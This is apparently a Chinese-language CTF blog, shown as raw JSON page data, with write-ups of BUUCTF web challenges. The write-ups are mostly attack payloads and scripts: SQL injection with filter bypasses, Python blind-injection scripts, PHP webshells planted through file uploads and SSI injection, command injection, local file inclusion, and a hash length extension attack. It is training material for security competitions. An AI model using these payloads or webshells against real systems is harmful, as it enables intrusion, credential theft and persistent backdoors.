htmlspecialchars(addslashes($_POST[\u0026#39;username\u0026#39;])); $pass = md5($_POST[\u0026#39;password\u0026#39;]); $sql = \u0026#34;select * from users where name = \u0026#39;$user\u0026#39; and pass = \u0026#39;$pass\u0026#39; limit 0,1\u0026#34;; $result = $conn-\u0026gt;query($sql); if($result-\u0026gt;num_rows){ $_SESSION[\u0026#39;username\u0026#39;] = $user; $_SESSION[\u0026#39;islogin\u0026#39;] = 1; $_SESSION[\u0026#39;number\u0026#39;] = 0; header(\u0026#34;Location: index.php\u0026#34;); exit(); }else{ die(\u0026#34;\u0026lt;font color=\u0026#39;red\u0026#39; size=\u0026#39;4\u0026#39;\u0026gt;登录失败\u0026lt;/font\u0026gt;\u0026#34;); } } } $conn-\u0026gt;close(); ?\u0026gt; addads.php：\n\u0026lt;?php session_start(); if(!$_SESSION[\u0026#39;islogin\u0026#39;]){ header(\u0026#34;Location: login.php\u0026#34;); exit(); } include_once(\u0026#34;./config.php\u0026#34;); error_reporting(0); if(isset($_POST[\u0026#39;ac\u0026#39;])){ if($_POST[\u0026#39;ac\u0026#39;] === \u0026#39;add\u0026#39;){ if($_SESSION[\u0026#39;number\u0026#39;] \u0026gt;= 10) die(\u0026#34;\u0026lt;font color=\u0026#39;red\u0026#39; size=\u0026#39;4\u0026#39;\u0026gt;申请的广告条数已达上限，请先清理\u0026lt;/font\u0026gt;\u0026#34;); $title = filter(addslashes($_POST[\u0026#39;title\u0026#39;])); $content = addslashes($_POST[\u0026#39;content\u0026#39;]); $sql_query = \u0026#34;select * from ads where title = \u0026#39;$title\u0026#39; limit 0,1\u0026#34;; $sql_insert = \u0026#34;insert into ads (title, content, belong) values (\u0026#39;$title\u0026#39;, \u0026#39;$content\u0026#39;, \u0026#39;\u0026#34;.addslashes($_SESSION[\u0026#39;username\u0026#39;]).\u0026#34;\u0026#39;)\u0026#34;; if(preg_match(\u0026#34;/updatexml|extractvalue|floor|name_const|join|exp|geometrycollection|multipoint|polygon|multipolygon|linestring|multilinestring|#|--|or|and/i\u0026#34;, $title)) die(\u0026#34;\u0026lt;font color=\u0026#39;red\u0026#39; size=\u0026#39;4\u0026#39;\u0026gt;标题含有敏感词汇\u0026lt;/font\u0026gt;\u0026#34;); $result_query = $conn-\u0026gt;query($sql_query); if($result_query-\u0026gt;num_rows) die(\u0026#34;\u0026lt;font color=\u0026#39;red\u0026#39; size=\u0026#39;4\u0026#39;\u0026gt;广告名称已存在\u0026lt;/font\u0026gt;\u0026#34;); else{ $result_insert = $conn-\u0026gt;query($sql_insert); if($result_insert){ $_SESSION[\u0026#39;number\u0026#39;] += 1; echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;已发送申请\u0026#39;);window.location.href=\u0026#39;index.php\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34;; exit(); }else{ die(\u0026#34;\u0026lt;font color=\u0026#39;red\u0026#39; size=\u0026#39;4\u0026#39;\u0026gt;申请失败\u0026lt;/font\u0026gt;\u0026#34;); } } } } $conn-\u0026gt;close(); ?\u0026gt; detail.php：\n\u0026lt;?php session_start(); if(!$_SESSION[\u0026#39;islogin\u0026#39;]){ header(\u0026#34;Location: login.php\u0026#34;); exit(); } include_once(\u0026#34;./config.php\u0026#34;); // error_reporting(0); $id = intval($_GET[\u0026#39;id\u0026#39;]); $title = htmlspecialchars_decode($_SESSION[\u0026#34;t\u0026#34;.$id]); $sql = \u0026#34;select * from ads where title = \u0026#39;$title\u0026#39; limit 0,1\u0026#34;; $result = $conn-\u0026gt;query($sql); @$row = mysqli_fetch_array($result); echo \u0026lt;\u0026lt;\u0026lt;EOF \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;广告详情\u0026lt;/h2\u0026gt; \u0026lt;table class=\u0026#34;table table-bordered\u0026#34;\u0026gt; \u0026lt;thead\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;th\u0026gt;广告名\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;广告内容\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;状态\u0026lt;/th\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/thead\u0026gt; \u0026lt;tbody\u0026gt; EOF; if($row){ $t = $row[\u0026#39;title\u0026#39;]; $c = $row[\u0026#39;content\u0026#39;]; echo \u0026#34;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026#34;.$t.\u0026#34;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#34;.$c.\u0026#34;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;待管理确认\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#34;; }else{ echo \u0026#34;\u0026lt;tr\u0026gt;\u0026lt;td colspan=\u0026#39;2\u0026#39;\u0026gt;未查找到相关广告信息\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; print_r(\u0026#34;\u0026lt;font color=\u0026#39;red\u0026#39;\u0026gt;\u0026#34;.mysqli_error($conn).\u0026#34;\u0026lt;/font\u0026gt;\u0026#34;); } echo \u0026lt;\u0026lt;\u0026lt;ROR \u0026lt;/tbody\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/div\u0026gt; ROR; $conn-\u0026gt;close(); ?\u0026gt; 在register.php中发现所有信息存储在users表中，字段名为name和pass：\n-100\u0026#39;/**/union/**/select/**/1,(select/**/group_concat(name,\u0026#34;:\u0026#34;,pass)/**/from/**/users),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/\u0026#39;\rflag:flag{06462a15-5082-450e-91c9-838c2e6bee4d},admin:53e217ad4c721eb9565cf25a5ec3b66e,test:e10adc3949ba59abbe56e057f20f883e [BSidesCF 2019]Futurella 看网页源码：flag{81fc69c0-d693-4042-9a9a-821ab2037cf8}\n[极客大挑战 2019]FinalSQL fuzz一下，登陆页面常规的符号如'空格#()--和关键字如and or都被过滤了，考虑注入search.php的id参数\n同样fuzz一下，单双引号都报error，猜测是数字型闭合，过滤了空格，同时报错无错误回显，尝试盲注\n查表名：\nimport requests import string url = \u0026#34;http://3c2999f1-f7fe-4fe4-9594-2c35c1d93268.node5.buuoj.cn:81/search.php\u0026#34; chars = string.ascii_lowercase + string.ascii_uppercase + string.digits tableName = \u0026#34;\u0026#34; for i in range(1,10): for c in chars: payload = f\u0026#34;0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{i},1))={ord(c)})\u0026#34; params = {\u0026#34;id\u0026#34;: payload} resp = requests.get(url, params=params) if \u0026#34;Click others\u0026#34; in resp.text: #print(c) tableName += c break print(tableName) # F1naI1y 查字段名：\ncolumnName = \u0026#34;\u0026#34; for i in range(1,20): for c in chars: payload = f\u0026#34;0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=\u0026#39;F1naI1y\u0026#39;)),{i},1))={ord(c)})\u0026#34; params = {\u0026#34;id\u0026#34;: payload} resp = requests.get(url, params=params) if \u0026#34;Click others\u0026#34; in resp.text: print(c) columnName += c break print(columnName) # id username password 查password字段：\nchars = r\u0026#34;-{}\u0026#34; + string.ascii_lowercase + string.digits flag = \u0026#34;\u0026#34; for i in range(1,43): for c in chars: payload = f\u0026#34;0^(ascii(substr((select(password)from(F1naI1y)where(password)regexp(\u0026#39;flag\u0026#39;)),{i},1))={ord(c)})\u0026#34; params = {\u0026#34;id\u0026#34;: payload} resp = requests.get(url, params=params) if \u0026#34;Click others\u0026#34; in resp.text: print(c) flag += c break print(flag) # flag{f1dc586c-f972-49f4-992e-a1db60c279bb} [CISCN 2019 初赛]Love Math 开头的$pi用于白名单检验，同时存储参数值_GET\nbase_convert36进制可以覆盖所有字母和数字，dechex用于绕过引号的过滤\n利用动态变量的机制$$pi来实现$_GET的效果，方括号用花括号绕过\n?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){1}(($$pi){2})\u0026amp;1=system\u0026amp;2=cat /flag\r_GETflag{3d85afda-5f52-44af-ae0e-279bc544d9d9} [极客大挑战 2019]RCE ME 取反绕过，直接传一句话木马连蚁剑：\n?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%CE%A2%D6%C4); // assert(eval($_REQUEST[1]);); 禁用了许多函数，要用到插件as_bypass_php_disable_functions\nflag{de68efc7-3711-4123-9331-049213b7c83f}\n[De1CTF 2019]SSRF Me hint：flag is in ./flag.txt\ncode.txt：\n#! /usr/bin/env python #encoding=utf-8 from flask import Flask from flask import request import socket import hashlib import urllib import sys import os import json reload(sys) sys.setdefaultencoding(\u0026#39;latin1\u0026#39;) app = Flask(__name__) secert_key = os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = {} result[\u0026#39;code\u0026#39;] = 500 if (self.checkSign()): if \u0026#34;scan\u0026#34; in self.action: tmpfile = open(\u0026#34;./%s/result.txt\u0026#34; % self.sandbox, \u0026#39;w\u0026#39;) resp = scan(self.param) if (resp == \u0026#34;Connection Timeout\u0026#34;): result[\u0026#39;data\u0026#39;] = resp else: print resp tmpfile.write(resp) tmpfile.close() result[\u0026#39;code\u0026#39;] = 200 if \u0026#34;read\u0026#34; in self.action: f = open(\u0026#34;./%s/result.txt\u0026#34; % self.sandbox, \u0026#39;r\u0026#39;) result[\u0026#39;code\u0026#39;] = 200 result[\u0026#39;data\u0026#39;] = f.read() if result[\u0026#39;code\u0026#39;] == 500: result[\u0026#39;data\u0026#39;] = \u0026#34;Action Error\u0026#34; else: result[\u0026#39;code\u0026#39;] = 500 result[\u0026#39;msg\u0026#39;] = \u0026#34;Sign Error\u0026#34; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False #generate Sign For Action Scan. @app.route(\u0026#34;/geneSign\u0026#34;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def geneSign(): param = urllib.unquote(request.args.get(\u0026#34;param\u0026#34;, \u0026#34;\u0026#34;)) action = \u0026#34;scan\u0026#34; return getSign(action, param) @app.route(\u0026#39;/De1ta\u0026#39;,methods=[\u0026#39;GET\u0026#39;,\u0026#39;POST\u0026#39;]) def challenge(): action = urllib.unquote(request.cookies.get(\u0026#34;action\u0026#34;)) param = urllib.unquote(request.args.get(\u0026#34;param\u0026#34;, \u0026#34;\u0026#34;)) sign = urllib.unquote(request.cookies.get(\u0026#34;sign\u0026#34;)) ip = request.remote_addr if(waf(param)): return \u0026#34;No Hacker!!!!\u0026#34; task = Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route(\u0026#39;/\u0026#39;) def index(): return open(\u0026#34;code.txt\u0026#34;,\u0026#34;r\u0026#34;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return \u0026#34;Connection Timeout\u0026#34; def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check=param.strip().lower() if check.startswith(\u0026#34;gopher\u0026#34;) or check.startswith(\u0026#34;file\u0026#34;): return True else: return False if __name__ == \u0026#39;__main__\u0026#39;: app.debug = False app.run(host=\u0026#39;0.0.0.0\u0026#39;,port=80) 思路是先用scan把./flag.txt读到tmpfile中，再用read读取tmpfile中的内容，从而获取flag：\ngeneSign?param=flag.txt\r813fcc8e24c182deb6b61769e19ea87b\rDe1ta?param=flag.txt\rCookie: action=scan; sign=813fcc8e24c182deb6b61769e19ea87b\r{\u0026#34;code\u0026#34;: 200} 此时已成功读出flag.txt的内容并写入tmpfile，问题在于geneSign无法生成action=read的签名，签名需要用到secret_key，而secert_key = os.urandom(16)是随机生成的，无法直接算出action=read的签名，但观察到对于action的判断是in而非=，if \u0026quot;read\u0026quot; in self.action，也就是说只要action中包含read并通过签名验证即可读取tmpfile\n看了其他师傅的wp，有两种方式实现\n方法一：\n/geneSign?param=flag.txtread\r28374b044d5de2e91388bf0c97844ad3 相当于计算了签名：hashlib.md5(secert_key + \u0026quot;flag.txtread\u0026quot; + \u0026quot;scan\u0026quot;).hexdigest()\n/De1ta?param=flag.txt\rCookie: action=readscan; sign=28374b044d5de2e91388bf0c97844ad3\r{\u0026#34;code\u0026#34;: 200, \u0026#34;data\u0026#34;: \u0026#34;flag{ac6dd589-46ef-4dd7-bac4-e5feab327f23}\\n\u0026#34;} 此时验证的签名：hashlib.md5(secert_key + \u0026quot;flag.txt\u0026quot; + \u0026quot;readscan\u0026quot;).hexdigest()，十分巧妙地避开了获取secret_key的问题，实现read\n方法二：哈希长度扩展攻击\n用到了工具https://github.com/shellfeel/hash-ext-attack，无需知道密钥，只要知道密钥长度和原签名字符即可\n/De1ta?param=flag.txt\rCookie: action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%E0%00%00%00%00%00%00%00read;sign=9f8245743d6fa44212ac4d78860a6643 [BJDCTF2020]EasySearch index.php.swp：\n\u0026lt;?php ob_start(); function get_hash(){ $chars = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^\u0026amp;*()+-\u0026#39;; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); } header(\u0026#34;Content-Type: text/html;charset=utf-8\u0026#34;); *** if(isset($_POST[\u0026#39;username\u0026#39;]) and $_POST[\u0026#39;username\u0026#39;] != \u0026#39;\u0026#39; ) { $admin = \u0026#39;6d0bc1\u0026#39;; if ( $admin == substr(md5($_POST[\u0026#39;password\u0026#39;]),0,6)) { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;[+] Welcome to manage system\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; $file_shtml = \u0026#34;public/\u0026#34;.get_hash().\u0026#34;.shtml\u0026#34;; $shtml = fopen($file_shtml, \u0026#34;w\u0026#34;) or die(\u0026#34;Unable to open file!\u0026#34;); $text = \u0026#39; *** *** \u0026lt;h1\u0026gt;Hello,\u0026#39;.$_POST[\u0026#39;username\u0026#39;].\u0026#39;\u0026lt;/h1\u0026gt; *** ***\u0026#39;; fwrite($shtml,$text); fclose($shtml); *** echo \u0026#34;[!] Header error ...\u0026#34;; } else { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;[!] Failed\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; }else { *** } *** ?\u0026gt; 爆破出md5值开头为6d0bc1的字符串：\nimport hashlib import itertools import string target_prefix = \u0026#34;6d0bc1\u0026#34; charset = string.printable # 可调整字符集范围以提高效率 def find_matching_hash(): for length in range(1, 10): # 尝试不同长度 for candidate in itertools.product(charset, repeat=length): candidate_str = \u0026#39;\u0026#39;.join(candidate) md5_hash = hashlib.md5(candidate_str.encode()).hexdigest() if md5_hash.startswith(target_prefix): print(f\u0026#34;Found: {candidate_str} -\u0026gt; {md5_hash}\u0026#34;) return candidate_str return None result = find_matching_hash() # Found: d`H6 -\u0026gt; 6d0bc16554ba2a22d39dca240829bf94 登录后响应头中有信息Url_Is_Here：\npublic/f1b405acb16df4e12abe7cbef5a03c9e1d0f7318.shtml 查阅相关资料，shtml可以执行ssi相关指令，只需控制username为ssi指令即可实现ssi注入：\nusername=\u0026lt;!--#exec cmd=\u0026#34;echo \u0026#39;\u0026lt;?php @eval($_REQUEST[1]) ?\u0026gt;\u0026#39; \u0026gt; ./shell.php\u0026#34; --\u0026gt; 写入一句话木马后连上蚁剑找到flag：flag{af9e11b8-eece-4384-bedd-4918a4e5fd97}\n[WUSTCTF2020]颜值成绩查询 过滤了空格，有3列：\n?stunum=1/**/order/**/by/**/3/**/--+ 过滤了union，试试双写绕过，查出表名flag，查出字段名flag,value，最后查flag字段：\n?stunum=0/**/ununionion/**/select/**/1,value,3/**/from/**/flag--+ flag{1858b6cb-b243-4156-82c9-9f36c347a9b4}\n懒得测试过滤和绕过也可以直接试试布尔盲注：\nimport requests import string url = \u0026#34;http://dedb92cb-82b8-4609-b424-2bc7b1e48e26.node5.buuoj.cn:81\u0026#34; chars = r\u0026#34;flag{-}\u0026#34; + string.digits + string.ascii_lowercase flag = \u0026#34;\u0026#34; for i in range(1,45): for c in chars: payload = f\u0026#34;0^(ascii(substr((select(group_concat(value))from(flag)where(value)regexp(\u0026#39;flag\u0026#39;)),{i},1))={ord(c)})\u0026#34; params = {\u0026#34;stunum\u0026#34;: payload} resp = requests.get(url, params=params) if \u0026#34;admin\u0026#34; in resp.text: print(c) flag += c break print(flag) ","permalink":"https://blog.w8nn9z.top/posts/ctf/buuojpage2/","summary":"","title":"BUUCTF WEB page2"},{"content":"[极客大挑战 2019]EasySQL 一个登录页面，猜测存在用户名admin，万能密码登录成功直接回显flag：\n?username=admin\u0026amp;password=1\u0026#39;+or+1+%23 flag{ecd75a20-0982-4d18-b5ea-ca0d11d6ce37}\n[极客大挑战 2019]Havefun 源码有段注释，GET传参?cat=dog即可：\n\u0026lt;!--\r$cat=$_GET[\u0026#39;cat\u0026#39;];\recho $cat;\rif($cat==\u0026#39;dog\u0026#39;){\recho \u0026#39;Syc{cat_cat_cat_cat}\u0026#39;;\r}\r--\u0026gt; flag{ea9d4a51-1fd0-40a7-82bd-c5097a9a09fb}\n[ACTF2020 新生赛]Include 起始页面有个tips，通过href属性实现了传参?file=flag.php并定向到如下页面：\nCan you find out the flag? 猜测对file的值用include来进行操作，导致php文件代码被解析，考虑使用伪协议把flag.php编码为base64数据流进行读取\n?file=php://filter/read=convert.base64-encode/resource=flag.php 再对base64进行解码即可：\nPD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7NjRkYjcwNDMtZDQ2YS00YjRlLWFlNDUtOGQwNzU4MGUxZTZmfQo=\r\u0026lt;?php\recho \u0026#34;Can you find out the flag?\u0026#34;;\r//flag{64db7043-d46a-4b4e-ae45-8d07580e1e6f} [HCTF 2018]WarmUp 源码注释：\n\u0026lt;!--source.php--\u0026gt; source.php：\n\u0026lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(\u0026amp;$page) { $whitelist = [\u0026#34;source\u0026#34;=\u0026gt;\u0026#34;source.php\u0026#34;,\u0026#34;hint\u0026#34;=\u0026gt;\u0026#34;hint.php\u0026#34;]; if (! isset($page) || !is_string($page)) { echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;) ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;) ); if (in_array($_page, $whitelist)) { return true; } echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } } if (! empty($_REQUEST[\u0026#39;file\u0026#39;]) \u0026amp;\u0026amp; is_string($_REQUEST[\u0026#39;file\u0026#39;]) \u0026amp;\u0026amp; emmm::checkFile($_REQUEST[\u0026#39;file\u0026#39;]) ) { include $_REQUEST[\u0026#39;file\u0026#39;]; exit; } else { echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;img src=\\\u0026#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\u0026#34; /\u0026gt;\u0026#34;; } ?\u0026gt; 可以发现，只需传入?file=hint.php即可第一次就return true，从而获取hint.php执行后的内容：\nflag not here, and flag in ffffllllaaaagggg php中include有这样的特性，会对文件路径先进行规范化处理，处理时不会检验目录(如hint.php?)是否存在，于是可以构造这样的payload：\n?file=hint.php?../../../../../ffffllllaaaagggg 有足够多的../，include对路径进行处理后就相当于执行：include(\u0026quot;/ffffllllaaaagggg\u0026quot;)\nflag{8c145a85-2948-4a4a-94fc-10bcb05cc91d}\n[ACTF2020 新生赛]Exec 123;find / -name flag\rPING 123 (0.0.0.123): 56 data bytes\r--- 123 ping statistics ---\r3 packets transmitted, 0 packets received, 100% packet loss\r/flag\r123;cat /flag\rPING 123 (0.0.0.123): 56 data bytes\r--- 123 ping statistics ---\r3 packets transmitted, 0 packets received, 100% packet loss\rflag{47584b5d-c259-40a3-9272-976c97ef47a1} [GXYCTF2019]Ping Ping Ping 先绕过空格读取index.php：\n\u0026lt;?php if(isset($_GET[\u0026#39;ip\u0026#39;])){ $ip = $_GET[\u0026#39;ip\u0026#39;]; if(preg_match(\u0026#34;/\\\u0026amp;|\\/|\\?|\\*|\\\u0026lt;|[\\x{00}-\\x{1f}]|\\\u0026gt;|\\\u0026#39;|\\\u0026#34;|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\u0026#34;, $ip, $match)){ echo preg_match(\u0026#34;/\\\u0026amp;|\\/|\\?|\\*|\\\u0026lt;|[\\x{00}-\\x{20}]|\\\u0026gt;|\\\u0026#39;|\\\u0026#34;|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\u0026#34;, $ip, $match); die(\u0026#34;fxck your symbol!\u0026#34;); } else if(preg_match(\u0026#34;/ /\u0026#34;, $ip)){ die(\u0026#34;fxck your space!\u0026#34;); } else if(preg_match(\u0026#34;/bash/\u0026#34;, $ip)){ die(\u0026#34;fxck your bash!\u0026#34;); } else if(preg_match(\u0026#34;/.*f.*l.*a.*g.*/\u0026#34;, $ip)){ die(\u0026#34;fxck your flag!\u0026#34;); } $a = shell_exec(\u0026#34;ping -c 4 \u0026#34;.$ip); echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; print_r($a); } ?\u0026gt; 过滤了很多，拼接字符串绕过即可：\n?ip=127.0.0.1;a=ag;b=fl;cat$IFS$9$b$a.php 源码注释中获取flag：flag{07709504-1033-43f4-b6dc-c8d428fb70bb}\n[SUCTF 2019]EasySQL 多次进行fuzz测试，发现过滤了union from where等常见语句，同时能大致猜测出后端的查询语句结构：\n114,5,66\rArray ( [0] =\u0026gt; 114 [1] =\u0026gt; 5 [2] =\u0026gt; 1 ) 114,5,0\rArray ( [0] =\u0026gt; 114 [1] =\u0026gt; 5 [2] =\u0026gt; 0 ) 猜测查询语句中有逻辑或||，可能结构如下：\nselect post_query || column_name from table_name 查一下有哪些表：\n1;show tables;\rArray ( [0] =\u0026gt; 1 ) Array ( [0] =\u0026gt; Flag ) 因为只有一张表，查询语句可以进一步精确：\nselect post_query || column_name from Flag 通配符未被过滤，于是可以构造出最终payload：\n*,514\rArray ( [0] =\u0026gt; flag{a712b4db-9fc5-41b5-8a6a-f0b18f52d576} [1] =\u0026gt; 1 ) 看了题目后端源码和其他师傅的wp发现还有一种做法，通过修改mysql配置来将||的功能更改为类似concat的功能：\n2;set sql_mode=pipes_as_concat;select 3\rArray ( [0] =\u0026gt; 2 ) Array ( [0] =\u0026gt; 3flag{a712b4db-9fc5-41b5-8a6a-f0b18f52d576} ) [极客大挑战 2019]LoveSQL 万能密码登录成功，回显了admin的账号和密码：\nHello admin！\rYour password is \u0026#39;1715a9fd6c554e96be4451229db26a83\u0026#39; 查字段数：\n?username=admin\u0026#39;+order+by+4+%23\u0026amp;password=1\r报错：Unknown column \u0026#39;4\u0026#39; in \u0026#39;order clause\u0026#39;\r?username=admin\u0026#39;+order+by+3+%23\u0026amp;password=1\r正常回显账号密码，说明字段数为3 查注入位置：\n?username=-1\u0026#39;+union+select+1%2C2%2C3+%23\u0026amp;password=1\rHello 2！\rYour password is \u0026#39;3\u0026#39; 查表名：\n?username=-1\u0026#39;+union+select+1%2C2%2Cgroup_concat(table_name)+from+information_schema.tables+where+table_schema%3Ddatabase()+%23\u0026amp;password=1\rHello 2！\rYour password is \u0026#39;geekuser,l0ve1ysq1\u0026#39; 查列名：\n?username=-1\u0026#39;+union+select+1%2C2%2Cgroup_concat(column_name)+from+information_schema.columns+where+table_name%3D\u0026#39;l0ve1ysq1\u0026#39;+%23\u0026amp;password=1\rHello 2！\rYour password is \u0026#39;id,username,password\u0026#39; 查字段数据：\n-1\u0026#39; union select 1,group_concat(username),group_concat(password) from l0ve1ysq1 #\rHello cl4y,glzjin,Z4cHAr7zCr,0xC4m3l,Ayrain,Akko,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,leixiao,flag！\rYour password is \u0026#39;wo_tai_nan_le,glzjin_wants_a_girlfriend,biao_ge_dddd_hm,linux_chuang_shi_ren,a_rua_rain,yan_shi_fu_de_mao_bo_he,cl4y,di_2_kuai_fu_ji,di_3_kuai_fu_ji,di_4_kuai_fu_ji,di_5_kuai_fu_ji,di_6_kuai_fu_ji,di_7_kuai_fu_ji,di_8_kuai_fu_ji,Syc_san_da_hacker,flag{a77c55c1-2629-477d-9d24-fbdcfcc722c5}\u0026#39; [极客大挑战 2019]Secret File 抓包在前端源码里能看到注释，访问secr3t.php，php伪协议传base64编码的flag.php：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;FLAG\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body style=\u0026#34;background-color:black;\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;h1 style=\u0026#34;font-family:verdana;color:red;text-align:center;\u0026#34;\u0026gt;啊哈！你找到我了！可是你看不到我QAQ~~~\u0026lt;/h1\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;p style=\u0026#34;font-family:arial;color:red;font-size:20px;text-align:center;\u0026#34;\u0026gt; \u0026lt;?php echo \u0026#34;我就在这里\u0026#34;; $flag = \u0026#39;flag{d2998aa0-03cb-4738-8117-271f44690fdc}\u0026#39;; $secret = \u0026#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd\u0026#39; ?\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; [强网杯 2019]随便注 单引号闭合，字段数为2，还有过滤，尝试绕过无果，考虑使用堆叠注入：\nreturn preg_match(\u0026#34;/select|update|delete|drop|insert|where|\\./i\u0026#34;,$inject); 获取表名：\n1\u0026#39;;show tables # 对两张表\u0026quot;1919810931114514\u0026quot;和\u0026quot;words\u0026quot;分别查询字段名，用反引号包裹表示表名：\n1\u0026#39;;show columns from `1919810931114514` #\r1\u0026#39;;show columns from `words` # flag在表\u0026quot;1919810931114514\u0026quot;中，没想到好的办法，参考了其他师傅的wp\n方法一：使用handler进行查询，不过handler并没有包含到SQL标准中，handler查询流程如下，只能一行一行获取数据：\nhandler table_name open\rhandler table_name read first\rhandler table_name read next\r...\rhandler table_name colse 可以自由获取当前表第一行、后一行、前一行、最后一行数据 first | next | prev | last\n1\u0026#39;;handler `1919810931114514` open;handler `1919810931114514` read first;handler `1919810931114514` close #\rarray(1) {\r[0]=\u0026gt;\rstring(42) \u0026#34;flag{468432d7-1f83-4a68-a18b-41d3bca79d4c}\u0026#34;\r} 方法二：将1919810931114514表名换为words，再将表中字段名flag改为data，添加具有默认值的字段id：\n1\u0026#39;;alter table `words` rename to `test`;alter table `1919810931114514` rename to `words`;alter table `words` add id int(10) DEFAULT \u0026#39;114\u0026#39;;alter table `words` change `flag` `data` varchar(100) # 查询id=114即可获取flag\n还有一种方法，concat+sql预编译，绕过select ，但是本题好像重新加了过滤，打不通了？\n1\u0026#39;;set @a = concat(\u0026#34;sele\u0026#34;,\u0026#34;ct \u0026#34;,\u0026#34;flag \u0026#34;,\u0026#34;from `1919810931114514`\u0026#34;);prepare test from @a;execute test #\r返回：strstr($inject, \u0026#34;set\u0026#34;) \u0026amp;\u0026amp; strstr($inject, \u0026#34;prepare\u0026#34;)，可能是waf？ [极客大挑战 2019]Http 源码里有个href属性，可以转到Secret.php，之后添加referer，修改UA头，添加XFF：\nUser-Agent: Syclover\rReferer: https://Sycsecret.buuoj.cn\rX-forwarded-for: 127.0.0.1 flag{eee1d380-bd94-4869-abab-7d2efd802354}\n[极客大挑战 2019]Upload 绕过.php后缀，content-type，文件头，以及\u0026lt;?字符的过滤：\nContent-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;shell.phtml\u0026#34;\rContent-Type: image/png\rGIF89a\u0026lt;script language=\u0026#34;php\u0026#34;\u0026gt;@eval($_POST[\u0026#34;shell\u0026#34;]);\u0026lt;/script\u0026gt; flag{e5eb2a91-3a85-4648-a111-457d0365762a}\n[极客大挑战 2019]Knife 直接给了shell，把执行结果写到了html里，看源码就行：flag{d304b859-96a0-4f0f-8f80-f4e18ee9404f}\n[ACTF2020 新生赛]Upload 前端要求上传jpg、png、gif结尾的图片，改一下后缀，后端也有后缀校验，再改一下phtml绕过即可：\nContent-Disposition: form-data; name=\u0026#34;upload_file\u0026#34;; filename=\u0026#34;shell.phtml\u0026#34;\rContent-Type: image/jpeg\r\u0026lt;?php @eval($_POST[\u0026#34;shell\u0026#34;]); ?\u0026gt; flag{4dbe9002-16a0-4972-9af5-dc6bbb7a5400}\n[极客大挑战 2019]BabySQL 单引号闭合，fuzz发现存在对关键字or,union,select,where,from的过滤，大小写无法绕过，尝试双写绕过：\n1\u0026#39; uniunionon seleselectct 1,2,3 #\r1\u0026#39; uniunionon seleselectct 1,database(),3 #\r1\u0026#39; 